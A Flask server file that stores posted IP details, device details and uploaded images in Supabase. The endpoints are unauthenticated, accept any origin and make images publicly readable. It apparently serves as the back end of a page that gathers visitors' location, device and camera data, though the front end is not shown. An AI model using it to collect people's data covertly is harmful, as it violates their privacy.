import os
from dotenv import load_dotenv
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import logging
from werkzeug.utils import secure_filename

load_dotenv()
app = Flask(__name__, static_folder='static')
CORS(app, origins="*")

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
STORAGE_BUCKET = "images"

app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024

try:
    from supabase import create_client
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
except:
    supabase = None

def save_to_db(payload):
    if not supabase: return
    try:
        supabase.table("logs").insert({"data": payload}).execute()
    except: pass

@app.route("/")
def index():
    return send_from_directory("static", "index.html")

@app.route("/health")
def health():
    return jsonify({"status": "ok", "supabase": supabase is not None})

@app.route("/api/ipinfo", methods=["POST"])
def ipinfo():
    save_to_db({"type": "ip", "data": request.json})
    return jsonify({"status": "ok"})

@app.route("/api/device-info", methods=["POST"])
def device():
    save_to_db({"type": "device", "data": request.json})
    return jsonify({"status": "ok"})

@app.route("/api/upload-image", methods=["POST"])
def upload():
    try:
        image = request.files["image"]
        filename = f"{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
        supabase.storage.from_(STORAGE_BUCKET).upload(filename, image.read())
        url = supabase.storage.from_(STORAGE_BUCKET).get_public_url(filename)
        save_to_db({"type": "image", "url": url})
        return jsonify({"status": "ok", "url": url})
    except:
        return jsonify({"error": "upload failed"}), 400
